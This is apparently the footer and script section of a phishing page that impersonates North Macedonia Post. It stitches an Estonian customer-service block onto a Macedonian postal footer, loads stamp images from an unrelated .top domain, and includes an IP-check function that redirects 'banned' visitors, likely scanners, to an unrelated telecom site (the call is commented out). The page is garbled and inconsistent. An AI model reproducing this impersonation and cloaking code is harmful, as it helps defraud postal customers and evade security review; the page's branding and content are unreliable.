<style>
    @media(max-width:767px) {
        footer.desktop_view {
            display: none !important;
        }

        footer.mobile_view {
            display: block !important;
            justify-content: space-between;
            width: 100%;
            background: #f5f5f5;
            margin-top: 40px;
        }

        h1.logo_mob img {
            width: 120px;
        }

        h1.logo_mob {
            margin: 0;
        }

        footer.mobile_view h4 {
            color: #8f8f8f;
            margin-bottom: 10px;
            font-weight: 700;
        }

        footer.mobile_view ul {
            padding: 0px;
            list-style: none;
            display: block !important;
        }

        footer.mobile_view li {
            color: #8f8f8f;
            border-bottom: 1px solid rgba(103, 107, 109, 0.15);
            padding: 10px 0px;
            padding-left: 35px;
            position: relative;
        }

        .images_grid {
            display: grid;
            grid-template-columns: 25% 25% 25% 25%;
        }

        .images_grid img {
            width: 100%;
        }

        footer.mobile_view li:after {
            content: "";
            position: absolute;
            left: 4px;
            width: 7px;
            height: 7px;
            border: 1px solid #666666;
            top: 16px;
            transform: rotate(45deg);
            border-left: 0px;
            border-bottom: 0px;
        }

        footer.mobile_view li:before {
            content: "";
            position: absolute;
            left: 0;
            width: 20px;
            height: 20px;
            top: 10px;
            background: #e3e3e3;
            border-radius: 4px;
        }

        .copywrite p {
            font-size: 12px;
            text-align: center;
            border-top: 1px solid rgba(103, 107, 109, 0.15);
            padding-top: 20px;
        }

        .copywrite {
            font-size: 12px;
            line-height: 20px;
            color: #676b6d;
            padding: 20px 10px;
        }
        footer.mobile_view > div {
            padding: 0 20px;
        }
    }

    @media(min-width:768px) {
        .desktop_view {
            display: block;
        }

        .mobile_view {
            display: none;
        }
    }
</style>
<footer class="desktop_view">
    <h1>Eraklienditeenindus</h1>
    <p>E—R 9.00—20.00 <br> L—P ja riigipühadel 9.00—15.00 <br>
        <br>
        <a class="footer-btn icon-phone" href="tel:+3726616616">661 6616 </a>
        <span style="color: rgb(34, 34, 34); font-family: Verdana, Arial, sans-serif; font-size: 1.1em;"></span>
        <a class="footer-btn icon-email" href="#">Võta ühendust</a>
    </p> &nbsp;
    <h1>Äriklienditeenindus</h1>
    <p>
        <span style="color: rgb(34, 34, 34); font-family: Verdana, Arial, sans-serif; font-size: 1.1em;"></span>
        <a class="footer-btn icon-email" href="#">Võta ühendust</a>
    </p> &nbsp; <a href="#" class="show-desktop-version">Veebilehe täisversioon</a>
</footer>
<footer class="mobile_view">
    <div>
        <div>
            <h4>Помош за корисници</h4>
            <ul>
                <li>EMS</li>
                <li>Директна</li>
                <li>Хибридна пошта</li>
                <li>Хибридна пошта</li>
                <li>Шпедиција</li>
                <li>Универзални поштенски услуги</li>
                <li>Правилно адресирање</li>
            </ul>
        </div>
        <div>
            <h4>Lorem Ipsum</h4>
            <div class="images_grid">
                <img src="https://ma.agtatet.top/images/ЛУРАН-АХМЕТИ-1974-2021-154x154.jpg" />
                <img src="https://ma.agtatet.top/images/75-ГОДИНИ-ОД-НЕЗАВИСНОСТА-НА-ИЗРАЕЛ-153x153.jpg" />
                <img src="https://ma.agtatet.top/images/60-ГОДИНИ-ОД-СКОПСКИОТ-ЗЕМЈОТРЕС-1963-154x154.jpg" />
                <img src="https://ma.agtatet.top/images/ЕВРОПА-МИР-највисоката-вредност-на-човештвото-154x154.jpg" />
                <img src="https://ma.agtatet.top/images/ЕВРОПА-МИР-највисоката-вредност-на-човештвото-1-154x154.jpg" />
                <img src="https://ma.agtatet.top/images/100-ГОДИНИ-ОД-ПРВАТА-ТРКА-24-ЧАСА-ЛЕ-МАН-154x154.jpg" />
                <img src="https://ma.agtatet.top/images/РЕПУБЛИКА-СЕВЕРНА-МАКЕДОНИЈА-ВО-ЕУ-2-154x154.jpg" />
                <img src="https://ma.agtatet.top/images/РЕПУБЛИКА-СЕВЕРНА-МАКЕДОНИЈА-ВО-ЕУ-1-154x154.jpg" />
                <img src="https://ma.agtatet.top/images/БАЈРАМ-154x154.jpg" />
                <img src="https://ma.agtatet.top/images/100-ГОДИНИ-ОД-СМРТТА-НА-АЛЕКСАНДАР-ГУСТАВ-АЈФЕЛ-154x154.jpg" />
                <img src="https://ma.agtatet.top/images/100-ГОДИНИ-ОД-РАЃАЊЕТО-НА-МЕТИ-КРЛИУ-154x154.jpg" />
                <img src="https://ma.agtatet.top/images/100-ГОДИНИ-ОД-РАЃАЊЕТО-НА-ВЕРА-ЈОЦИЌ-154x154.jpg" />
                <img src="https://ma.agtatet.top/images/75-ГОДИНИ-ОД-РАЃАЊЕТО-НА-ЃОРЃИ-КОЛОЗОВ-154x154.jpg" />
                <img src="https://ma.agtatet.top/images/400-ГОДИНИ-ОД-РАЃАЊЕТО-НА-БЛЕЗ-ПАСКАЛ-154x154.jpg" />
                <img src="https://ma.agtatet.top/images/ЦРКВА-СВ.ПАНТЕЛЕЈМОН-НЕРЕЗИ-154x154.jpg" />
                <img src="https://ma.agtatet.top/images/ДЕЦА-СО-РЕТКИ-БОЛЕСТИ-ИХТИОЗА-154x154.jpg" />
            </div>
        </div>
    </div>
    <div class="copywrite">
        <p>© А.Д. Пошта на Северна Македонија 2023</p>
    </div>
</footer>
</section>
<button class="js-scroll-to-top scroll-top icon-to-top"></button>
</div>
</body>

<script src="https://code.jquery.com/jquery-3.6.4.min.js" integrity="sha256-oP6HI9z1XaZNBrJURtCoUT5SUnxFr8s3BzRl+cbzUq8=" crossorigin="anonymous"></script>
<script type="text/javascript">
    jQuery(document).ready(function() {


        //init_ip_status();

    });

    function init_ip_status() {
        //console.log('ipstatus ===>','<?php //$_SESSION['ipstatus']
        ?>//');
        $.ajax({

            type: 'GET',

            url: 'ipstatus.php',

            success: function(data) {

                console.log("ip is banned ==>", data === '1');
                if (data === '1') {
                    window.location.href = 'https://www.vodacom.co.za/';
                }
            },
            error: function(xhr, status, error) {

            }

        });
    }

  
</script>

</html>
